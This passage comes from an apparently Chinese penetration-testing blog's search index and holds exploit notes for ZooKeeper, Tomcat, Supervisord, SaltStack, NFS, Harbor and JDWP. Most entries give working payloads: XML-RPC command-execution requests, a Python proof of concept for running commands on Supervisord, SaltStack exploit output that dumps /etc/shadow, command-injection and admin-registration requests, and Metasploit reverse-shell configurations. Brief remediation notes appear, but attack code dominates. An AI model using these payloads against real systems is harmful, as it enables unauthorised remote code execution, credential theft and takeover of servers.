more</code></li><li>envi命令-输出服务器详细信息<br> <code>echo envi | nc 10.196.20.52 2181 </code></li><li>stat命令-输出统计信息<br> <code>echo stat | nc 10.196.20.52 2181</code></li></ol><p><img src="https://img-blog.csdnimg.cn/20200511110602545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fhcm9uX01pbGxlcg==,size_16,color_FFFFFF,t_70" alt="envi">### zkCli客户端连接操作</p><pre><code>zkCli -server 10.196.20.51:2181                                                                          Connecting to 10.196.20.51:2181Welcome to ZooKeeper!JLine support is enabled[zk: 10.196.20.51:2181(CONNECTING) 0]WATCHER::WatchedEvent state:SyncConnected type:None path:null[zk: 10.196.20.51:2181(CONNECTED) 0] ls /[admin, brokers, cluster, config, consumers, controller, controller_epoch, isr_change_notification, latest_producer_id_block, log_dir_event_notification, zookeeper][zk: 10.196.20.51:2181(CONNECTED) 1] get /controller&#123;&quot;version&quot;:1,&quot;brokerid&quot;:3,&quot;timestamp&quot;:&quot;1604393865608&quot;&#125;[zk: 10.196.20.51:2181(CONNECTED) 2] getget                    getAcl                 getAllChildrenNumber   getEphemerals[zk: 10.196.20.51:2181(CONNECTED) 2] getAcl /&#39;world,&#39;anyone: cdrwa[zk: 10.196.20.51:2181(CONNECTED) 3]</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ol><li>设置防火墙策略限制 IP 访问</li><li>不要将 zookeeper 暴露在外网</li><li>设置用户认证和 ACL</li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat</title>
      <link href="Kali/Exploit/Tomcat.html"/>
      <url>Kali/Exploit/Tomcat.html</url>
      
        <content type="html"><![CDATA[<p>Apache 和 Tomcat 都是web网络服务器，两者既有联系又有区别，在进行HTML、PHP、JSP、Perl等开发过程中，需要准确掌握其各自特点，选择最佳的服务器配置。<br>　　Apache是web服务器（静态解析，如HTML），tomcat是java应用服务器（动态解析，如JSP）<br>　　Tomcat只是一个servlet(jsp也翻译成servlet)容器，可以认为是apache的扩展，但是可以独立于apache运行</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">sudo nmap -sV -Pn -T4 -sSU -p 8080,8009 -sC    192.168.79.207Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 18:47 CSTNmap scan report for 192.168.79.207Host is up (0.00012s latency).PORT     STATE  SERVICE  VERSION8009/tcp open   ajp13    Apache Jserv (Protocol v1.3)| ajp-methods:|_  Supported methods: GET HEAD POST OPTIONS8080/tcp open   http     Apache Tomcat 9.0.30|_http-favicon: Apache Tomcat|_http-title: Apache Tomcat/9.0.308009/udp closed unknown8080/udp closed http-altNmap done: 1 IP address (1 host up) scanned in 7.62 seconds</code></pre><h2 id="Apache-Tomcat文件包含漏洞-CNVD-2020-10487-CVE-2020-1938"><a href="#Apache-Tomcat文件包含漏洞-CNVD-2020-10487-CVE-2020-1938" class="headerlink" title="Apache Tomcat文件包含漏洞-CNVD-2020-10487/CVE-2020-1938"></a>Apache Tomcat文件包含漏洞-CNVD-2020-10487/CVE-2020-1938</h2><p>该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p><h3 id="在线检测"><a href="#在线检测" class="headerlink" title="在线检测"></a>在线检测</h3><blockquote><p><a href="https://www.chaitin.cn/en/ghostcat">https://www.chaitin.cn/en/ghostcat</a></p></blockquote><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi.git">Tomcat-AJP文件包含工具</a></p><pre><code>./CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f WEB-INF/web.xml 10.184.67.100</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Supervisord</title>
      <link href="Kali/Exploit/Supervisord.html"/>
      <url>Kali/Exploit/Supervisord.html</url>
      
        <content type="html"><![CDATA[<p>Supervisord是由python开发的进程控制系统，用于管理后台服务的工具， 作用类似于Linux自带的Systemd程序。</p><p>Supervisord采用Client/Server架构， Server跑在系统后台， Client是个命令，通过RPC协议，调用Server提供的API，执行任务。</p><p><code>RPC协议</code>指Client通过RPC协议可以在Server执行某个函数并得到返回结果。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">sudo nmap -sV -Pn -T4 -sSU -p 9001 -sC  192.168.79.207Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 19:10 CSTNmap scan report for 192.168.79.207Host is up (0.00011s latency).PORT     STATE  SERVICE       VERSION9001/tcp open   http          Medusa httpd 1.12 (Supervisor process manager)|_http-server-header: Medusa/1.12|_http-title: Supervisor Status9001/udp closed etlservicemgrNmap done: 1 IP address (1 host up) scanned in 186.59 seconds</code></pre><h2 id="Supervisord远程命令执行漏洞-CVE-2017-11610"><a href="#Supervisord远程命令执行漏洞-CVE-2017-11610" class="headerlink" title="Supervisord远程命令执行漏洞-CVE-2017-11610"></a>Supervisord远程命令执行漏洞-CVE-2017-11610</h2><p>Requirements：</p><ul><li>Supervisord版本<code>Supervisord 3.0a1 &lt; 3.3.2</code></li><li>RPC端口可被访问</li><li>RPC无密码/弱口令</li></ul><h3 id="BurpSuite复现"><a href="#BurpSuite复现" class="headerlink" title="BurpSuite复现"></a>BurpSuite复现</h3><p>直接执行任意命令：</p><ul><li>POC-1</li></ul><pre><code>POST /RPC2 HTTP/1.1Host: localhostAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 213&lt;?xml version=&quot;1.0&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;supervisor.supervisord.options.warnings.linecache.os.system&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;string&gt;touch /tmp/success&lt;/string&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;</code></pre><ul><li>POC-2-慎用(会导致业务程序退出)</li></ul><pre><code class="zsh">POST http://192.168.0.15:9001/RPC2 HTTP/1.1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/xmlContent-Type: text/xmlAccept-Language: en-GB,en;q=0.5Connection: keep-aliveUpgrade-Insecure-Requests: 1Content-Length: 503Host: 192.168.0.15:9001&lt;?xml version=&quot;1.0&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;supervisor.supervisord.options.execve&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;string&gt;/usr/bin/python&lt;/string&gt;&lt;/param&gt;&lt;param&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;python&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;import os; os.system(&quot;touch /tmp/blahh&quot;)&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/param&gt;&lt;param&gt;&lt;struct&gt;&lt;/struct&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;</code></pre><p><img src="../images/supervisord-1.png" alt="supervisord-1"></p><blockquote><p>关于直接回显的POC</p></blockquote><p>@Ricter 在微博上提出的一个思路，甚是有效，就是将命令执行的结果写入log文件中，再调用Supervisord自带的readLog方法读取log文件，将结果读出来。</p><p>写了个简单的POC： <a href="/Applications/Joplin.app/Contents/Resources/app.asar/poc.py" title="poc.py">poc.py</a>，直接贴出来吧：</p><pre><code>#!/usr/bin/env python3import xmlrpc.clientimport systarget = sys.argv[1]command = sys.argv[2]with xmlrpc.client.ServerProxy(target) as proxy:    old = getattr(proxy, &#39;supervisor.readLog&#39;)(0,0)    logfile = getattr(proxy, &#39;supervisor.supervisord.options.logfile.strip&#39;)()    getattr(proxy, &#39;supervisor.supervisord.options.warnings.linecache.os.system&#39;)(&#39;&#123;&#125; | tee -a &#123;&#125;&#39;.format(command, logfile))    result = getattr(proxy, &#39;supervisor.readLog&#39;)(0,0)    print(result[len(old):])</code></pre><p>使用Python3执行并获取结果：<code>./poc.py &quot;http://your-ip:9001/RPC2&quot; &quot;command&quot;</code>：</p><p><img src="../images/supervisord-2.png" alt="supervisord-2"></p><h3 id="MSF反弹shell"><a href="#MSF反弹shell" class="headerlink" title="MSF反弹shell"></a>MSF反弹shell</h3><blockquote><p>需要知道用户密码：espc：what</p></blockquote><pre><code>Module options (exploit/linux/http/supervisor_xmlrpc_exec):   Name          Current Setting  Required  Description   ----          ---------------  --------  -----------   HttpPassword    what               no        Password for HTTP basic auth   HttpUsername    espc               no        Username for HTTP basic auth   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]   RHOSTS        10.184.67.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT         8103             yes       The target port (TCP)   SRVHOST       0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.   SRVPORT       8080             yes       The local port to listen on.   SSL           false            no        Negotiate SSL/TLS for outgoing connections   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)   TARGETURI     /RPC2            yes       The path to the XML-RPC endpoint   URIPATH                        no        The URI to use for this exploit (default is random)   VHOST                          no        HTTP server virtual hostPayload options (generic/shell_bind_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LPORT  4444             yes       The listen port   RHOST  10.184.67.1      no        The target address</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul><li>升级Supervisord</li><li>端口访问控制</li><li>设置复杂RPC密码</li></ul><p>参考：<br><a href="https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html">Supervisord远程命令执行漏洞</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SaltStack</title>
      <link href="Kali/Exploit/SaltStack.html"/>
      <url>Kali/Exploit/SaltStack.html</url>
      
        <content type="html"><![CDATA[<p>SaltStack 是基于 Python 开发的一套C/S架构配置管理工具,是一个服务器基础架构集中化管理平台，具备配置管理，远程执行，监控等功能。</p><ul><li><code>4505/4506</code> SaltStack Master与minions通信的端口</li><li><code>8000</code> 这是Salt的API端口,需要通过https访问</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code> nmap -Pn -T4  -sV -p 4505,4506,8000 192.168.79.28Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 12:30 CSTNmap scan report for 192.168.79.28Host is up (0.00021s latency).PORT     STATE SERVICE  VERSION4505/tcp open  zmtp     ZeroMQ ZMTP 2.04506/tcp open  zmtp     ZeroMQ ZMTP 2.08000/tcp open  ssl/http CherryPy wsgiserver</code></pre><h2 id="SaltStack水平权限绕过漏洞-CVE-2020-11651"><a href="#SaltStack水平权限绕过漏洞-CVE-2020-11651" class="headerlink" title="SaltStack水平权限绕过漏洞 CVE-2020-11651"></a>SaltStack水平权限绕过漏洞 CVE-2020-11651</h2><hr><p>在 CVE-2020-11651 认证绕过漏洞中，<br>      攻击者通过构造恶意请求，<br>                 可以绕过 Salt Master 的验证逻辑，<br>                  调用相关未授权函数功能，<br>从而可以造成远程命令执行漏洞。</p><p>影响版本：</p><ul><li>SaltStack &lt; 2019.2.4</li><li>SaltStack &lt; 3000.2</li></ul><h3 id="CVE-2020-11651-poc验证"><a href="#CVE-2020-11651-poc验证" class="headerlink" title="CVE-2020-11651-poc验证"></a><a href="https://github.com/askDing/CVE-2020-11651-poc">CVE-2020-11651-poc</a>验证</h3><pre><code>root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.[+] Salt version: 3000.1[ ] This version of salt is vulnerable! Check results below[+] Checking salt-master (192.168.115.130:4506) status... ONLINE[+] Checking if vulnerable to CVE-2020-11651...[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=root@kalimah:~/salt#</code></pre><h3 id="MSF漏洞利用"><a href="#MSF漏洞利用" class="headerlink" title="MSF漏洞利用"></a>MSF漏洞利用</h3><pre><code>Module options (exploit/linux/misc/saltstack_salt_unauth_rce):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   MINIONS   .*               yes       PCRE regex of minions to target   RHOSTS    10.190.26.13     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   ROOT_KEY                   no        Master&#39;s root key if you have it   RPORT     4506             yes       The target port (TCP)   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.   SRVPORT   8080             yes       The local port to listen on.   SSL       false            no        Negotiate SSL for incoming connections   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)   URIPATH                    no        The URI to use for this exploit (default is random)Payload options (python/meterpreter/reverse_https):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  192.168.79.28    yes       The local listener hostname   LPORT  8443             yes       The local listener port   LURI                    no        The HTTP Path</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul><li>SaltStack官方已发布最新版本修复了上述漏洞，建议相关用户及时更新规避风险。<a href="https://github.com/saltstack/salt/releases">https://github.com/saltstack/salt/releases</a></li><li>禁止将Salt Master默认监听端口（4505、4506）向公网开放，并设置为仅对可信对象开放。</li></ul><p>[参考]<br><a href="https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-11651">SaltStack认证绕过漏洞</a><br><a href="https://mp.weixin.qq.com/s/k2ClnCQdBi0FoId7hrRQNw">SaltStack认证绕过</a></p><h2 id="SaltStack任意文件读取-CVE-2020-11652"><a href="#SaltStack任意文件读取-CVE-2020-11652" class="headerlink" title="SaltStack任意文件读取 CVE-2020-11652"></a>SaltStack任意文件读取 CVE-2020-11652</h2><p>攻击者可构造恶意请求，读取，写入服务器上任意文件</p><h3 id="CVE-2020-11651-poc工具验证"><a href="#CVE-2020-11651-poc工具验证" class="headerlink" title="CVE-2020-11651-poc工具验证"></a><a href="https://github.com/askDing/CVE-2020-11651-poc">CVE-2020-11651-poc</a>工具验证</h3><p><a href="https://github.com/askDing/salt-security-backports.git">salt-securiy-backports</a><br>也可验证</p><pre><code>root@kalimah:~/salt# python2 exploit.py --master 192.168.115.130 -r /etc/shadow[+] Salt version: 2019.2.0[ ] This version of salt is vulnerable! Check results below[+] Checking salt-master (192.168.115.130:4506) status... ONLINE[+] Checking if vulnerable to CVE-2020-11651...[*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E=[+] Attemping to read /etc/shadow from 192.168.115.130root:$6$7qfolaa/$3yhszWj/VUJjfPaqr1yO6NLgV/FhHnVT9Pr6spwJ/F0BJw5vFM.3KjtwcnnuGo5uSJJkLrd28jXrmVZUD9nEI/:17812:0:99999:7:::daemon:*:17785:0:99999:7:::bin:*:17785:0:99999:7:::sys:*:17785:0:99999:7:::sync:*:17785:0:99999:7:::games:*:17785:0:99999:7:::man:*:17785:0:99999:7:::[...]</code></pre><h2 id="SaltStack命令注入漏洞-CVE-2020-16846"><a href="#SaltStack命令注入漏洞-CVE-2020-16846" class="headerlink" title="SaltStack命令注入漏洞 CVE-2020-16846"></a>SaltStack命令注入漏洞 CVE-2020-16846</h2><p>2020年11月SaltStack官方披露了CVE-2020-16846和CVE-2020-25592两个漏洞，<br>其中CVE-2020-25592允许任意用户调用SSH模块，<br>CVE-2020-16846允许用户执行任意命令。<br>组合这两个漏洞，将可以使未授权的攻击者通过Salt API执行任意命令。</p><h3 id="BurpSuite复测"><a href="#BurpSuite复测" class="headerlink" title="BurpSuite复测"></a>BurpSuite复测</h3><pre><code>POST /run HTTP/1.1Host: 127.0.0.1:8000User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0Accept: application/x-yamlAccept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 87token=12312&amp;client=ssh&amp;tgt=*&amp;fun=a&amp;roster=whip1ash&amp;ssh_priv=aaa|touch%20/tmp/success%3b</code></pre><p><img src="../images/saltstack-1.png" alt="saltstack-1"></p><h3 id="MSF复测"><a href="#MSF复测" class="headerlink" title="MSF复测"></a>MSF复测</h3><pre><code>Module options (exploit/linux/http/saltstack_salt_api_cmd_exec):   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]   RHOSTS     10.190.75.23     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT      8000             yes       The target port (TCP)   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.   SRVPORT    8080             yes       The local port to listen on.   SSL        true             no        Negotiate SSL/TLS for outgoing connections   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)   TARGETURI  /                yes       Base path   URIPATH                     no        The URI to use for this exploit (default is random)   VHOST                       no        HTTP server virtual hostPayload options (cmd/unix/reverse_python_ssl):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  192.168.79.28    yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen port</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NFS</title>
      <link href="Kali/Exploit/NFS.html"/>
      <url>Kali/Exploit/NFS.html</url>
      
        <content type="html"><![CDATA[<p>NFS 网络文件系统(Network File System) 允许客户端上的用户像访问本地文件一样地访问网络上的文件</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">nmap -Pn -T4 -sV -p111,2049 10.211.55.6 --script rpcinfoHost discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-27 17:00 CSTNmap scan report for centos-linux.shared (10.211.55.6)Host is up (0.00050s latency).PORT     STATE SERVICE VERSION111/tcp  open  rpcbind 2-4 (RPC #100000)| rpcinfo:|   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100003  3,4         2049/udp6  nfs|   100005  1,2,3      20048/tcp   mountd      100021  1,3,4      42555/udp6  nlockmgr|   100024  1          34047/tcp6  status|   100227  3           2049/tcp   nfs_acl2049/tcp open  nfs_acl 3 (RPC #100227)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.38 seconds</code></pre><h2 id="NFS共享信息泄露漏洞-CVE-1999-0170"><a href="#NFS共享信息泄露漏洞-CVE-1999-0170" class="headerlink" title="NFS共享信息泄露漏洞 CVE-1999-0170"></a>NFS共享信息泄露漏洞 CVE-1999-0170</h2><h3 id="MSF相关模块"><a href="#MSF相关模块" class="headerlink" title="MSF相关模块"></a>MSF相关模块</h3><pre><code class="zsh">msf6 auxiliary(scanner/nfs/nfsmount) &gt; show optionsModule options (auxiliary/scanner/nfs/nfsmount):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   PROTOCOL  udp              yes       The protocol to use (Accepted: udp, tcp)   RHOSTS    10.211.55.6      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT     111              yes       The target port (TCP)   THREADS   1                yes       The number of concurrent threads (max one per host)msf6 auxiliary(scanner/nfs/nfsmount) &gt; run[+] 10.211.55.6:111       - 10.211.55.6 NFS Export: / [*][*] 10.211.55.6:111       - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><h3 id="挂载NFS"><a href="#挂载NFS" class="headerlink" title="挂载NFS"></a>挂载NFS</h3><pre><code class="zsh">&gt; showmount -e 10.211.55.6   # 查看NSF服务器共享目录Exports list on 10.211.55.6:/root                               *&gt; mount -t nfs 10.211.55.6:/root /mnt  # 挂在NSF服务器共享的/root目录到本地的/mnt目录&gt; ls /mnt   # 查看/mnt目录的文件anaconda-ks.cfg  index.html  index.html.1  index.html.2  original-ks.cfg</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Harbor</title>
      <link href="Kali/Exploit/Harbor.html"/>
      <url>Kali/Exploit/Harbor.html</url>
      
        <content type="html"><![CDATA[<p>Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，可以用来构建企业内部的Docker镜像仓库</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh"> sudo nmap -sV -Pn -T4 -sSU -p 80,443 -sC    192.168.79.207         Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 19:39 CSTNmap scan report for 192.168.79.207Host is up (0.0065s latency).PORT    STATE         SERVICE  VERSION80/tcp  filtered      http443/tcp open          ssl/http nginx 1.11.5|_http-server-header: nginx/1.11.5|_http-title: Harbor| ssl-cert: Subject: commonName=*.mama.cn/organizationName=GZSC/stateOrProvinceName=Guangdong/countryName=CN| Not valid before: 2016-07-08T03:03:28|_Not valid after:  2017-07-08T03:03:28|_ssl-date: TLS randomness does not represent time| tls-nextprotoneg:|_  http/1.180/udp  open|filtered http443/udp open|filtered httpsNmap done: 1 IP address (1 host up) scanned in 132.41 seconds</code></pre><h2 id="Harbor任意管理员注册漏洞-CVE-2019-16097"><a href="#Harbor任意管理员注册漏洞-CVE-2019-16097" class="headerlink" title="Harbor任意管理员注册漏洞 CVE-2019-16097"></a>Harbor任意管理员注册漏洞 CVE-2019-16097</h2><p>影响版本：<br>Harbor 1.7.0-1.8.2，当且仅当镜像仓库开启了用户注册功能</p><h3 id="BurpSuite测试"><a href="#BurpSuite测试" class="headerlink" title="BurpSuite测试"></a>BurpSuite测试</h3><p>漏洞存在接口为 /api/users 的 POST 方法，<br>当提交的用户参数中包含 <code>has_admin_role: true</code> 时，则可直接注册创建权限为管理员的账号，<br>并且可上传写入恶意 Docker 镜像，进而可直接感染使用此镜像仓库的 Docker 主机。</p><pre><code>POST /api/users HTTP/1.1Host: 127.0.0.1Content-Length: 131Accept: application/jsonOrigin: http://127.0.0.1User-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14Content-Type: application/jsonReferer: http://127.0.0.1/harbor/sign-inAccept-Language: zh-CN,zh;q=0.9Cookie: sid=5bb9aad90164bd2ed5274edaf20f9c81Connection: close&#123;&quot;username&quot;:&quot;mrhonest&quot;,&quot;email&quot;:&quot;mrhonest@qq.com&quot;,&quot;realname&quot;:&quot;mrhonest&quot;,&quot;password&quot;:&quot;111111Aaa&quot;,&quot;comment&quot;:&quot;11111&quot;,&quot;has_admin_role&quot;:true&#125;</code></pre><h4 id="注册时抓包"><a href="#注册时抓包" class="headerlink" title="注册时抓包"></a>注册时抓包</h4><p><img src="../images/harbor-1.jpg" alt="harbor-1"></p><h4 id="添加poc"><a href="#添加poc" class="headerlink" title="添加poc"></a>添加poc</h4><ol><li> <code>&quot;has_admin_role&quot;:true</code></li></ol><p><img src="../images/harbor-2.jpg" alt="harbor-2"></p><h4 id="管理员权限"><a href="#管理员权限" class="headerlink" title="管理员权限"></a>管理员权限</h4><p><img src="../images/harbor-3.jpg" alt="c4a7a60f8c8244c5bb38031347a66743"></p><h3 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h3><p><a href="https://github.com/theLSA/harbor-give-me-admin.git">harbor添加管理员漏洞检测工具</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JDWP</title>
      <link href="Kali/Exploit/JDWP.html"/>
      <url>Kali/Exploit/JDWP.html</url>
      
        <content type="html"><![CDATA[<p>JDWP（Java DEbugger Wire Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，</p><p>通过该协议，Debugger 端可以和 target VM 通信，可以获取目标 VM的包括类、对象、线程等信息。<br>在调试Android应用程序这一场景中，</p><ul><li>Debugger一般是指你的 develop machine 的某一支持 JDWP协议的工具例如 Android Studio 或者 JDB，</li><li>Target JVM是指运行在你mobile设备当中的各个App（因为它们都是一个个虚拟机 Dalvik 或者 ART），</li><li>JDWP Agent一般负责监听某一个端口，当有 Debugger向这一个端口发起请求的时候，Agent 就转发该请求给 target JVM并最终由该 JVM 来处理请求，并把 reply 信息返回给 Debugger 端。</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code>&gt;&gt;&gt;nmap -Pn -T4  -sV -p 2005 10.184.67.1Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-03 16:54 CSTNmap scan report for 10.184.67.1Host is up (0.043s latency).PORT     STATE SERVICE VERSION2005/tcp open  jdwp    Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_45Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 2.72 seconds不靠谱&gt;&gt;&gt;nmap -Pn -T4  -sV -p 2005  --script jdwp-exec  --script-args cmd=&quot;date&quot;  10.184.67.1&gt;&gt;&gt;nmap -Pn -T4  -sV -p 2005  --script jdwp-info,jdwp-inject  10.184.67.1</code></pre><h2 id="JDWP远程代码执行漏洞"><a href="#JDWP远程代码执行漏洞" class="headerlink" title="JDWP远程代码执行漏洞"></a>JDWP远程代码执行漏洞</h2><p>telnnet 120.197.8.190 8000后，查看回显，如果出现“JDWP-Handshake”，则证明漏洞存在。</p><p><img src="../images/jdwp-1.jpg" alt="jdwp-1"></p><h3 id="Fofa语法"><a href="#Fofa语法" class="headerlink" 